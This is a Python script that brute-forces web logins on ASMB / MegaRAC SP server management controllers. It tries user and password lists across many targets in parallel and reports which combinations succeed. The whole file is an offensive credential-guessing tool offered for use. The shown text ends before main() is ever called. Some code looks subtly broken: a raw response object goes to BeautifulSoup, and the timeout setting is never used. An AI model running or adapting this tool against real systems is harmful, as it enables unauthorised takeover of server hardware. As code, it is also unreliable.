#! /usr/bin/env python3

import requests, warnings
from base64 import b64encode
from bs4 import BeautifulSoup
from urllib.parse import quote
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Lock, Pool, cpu_count
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

scheme = "http"
lock = Lock()
thread_count = cpu_count()
warnings.filterwarnings('ignore')
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def login(server, username='admin', password='admin', scheme="http", timeout=None):
    t1 = time()
    try:
        headers["Host"] = server.split(':')[0]
        if BeautifulSoup(requests.get(f"{scheme}://{server}"), "html.parser").find("title").text.strip().lower() == "megarac sp":
            response = requests.post(f"{scheme}://{server}/rpc/WEBSES/create.asp", headers=headers, data=f"WEBVAR_USERNAME={quote(username)}&WEBVAR_PASSWORD={quote(password)}")
            login_status = True if "fail" not in response.text.lower() else False
        else:
            response = requests.post(f"{scheme}://{server}/api/session", headers=headers, data=f"username={quote(username)}&password={quote(password)}")
            login_status = True if response.status_code // 100 == 2 else False
        t2 = time()
        return login_status, t2-t1
    except Exception as error:
        t2 = time()
        return error, t2-t1
def brute_force(thread_index, servers, credentials, scheme="http", timeout=None):
    successful_logins = {}
    for credential in credentials:
        status = ['']
        for server in servers:
            status = login(server, credential[0], credential[1], scheme, timeout)
            if status[0] == True:
                successful_logins[server] = [credential[0], credential[1]]
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status[0] == False:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
    return successful_logins
def main(servers, credentials, scheme="http", timeout=None):
    successful_logins = {}
    pool = Pool(thread_count)
    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
    threads = []
    total_servers = len(servers)
    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
    for index, server_division in enumerate(server_divisions):
        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme, timeout)))
    for thread in threads:
        successful_logins.update(thread.get())
    pool.close()
    pool.join()
    display('+', f"Threads Finished Excuting")
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-s', "--server", "server", "Target ASMB Server (seperated by ',' or File Name)"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-S', "--scheme", "scheme", f"Scheme to use (Default={scheme})"),
                              ('-t', "--timeout", "timeout", "Timeout for Login Request"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.server:
        display('-', f"Please specify {Back.YELLOW}Target Servers{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.server, 'r') as file:
                arguments.server = [server for server in file.read().split('\n') if server != '']
        except FileNotFoundError:
            arguments.server = arguments.server.split(',')
        except Exception as error:
            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.credentials:
        if not arguments.users:
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            arguments.users = ['']
            arguments.password = ['']
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        elif arguments.password != ['']:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)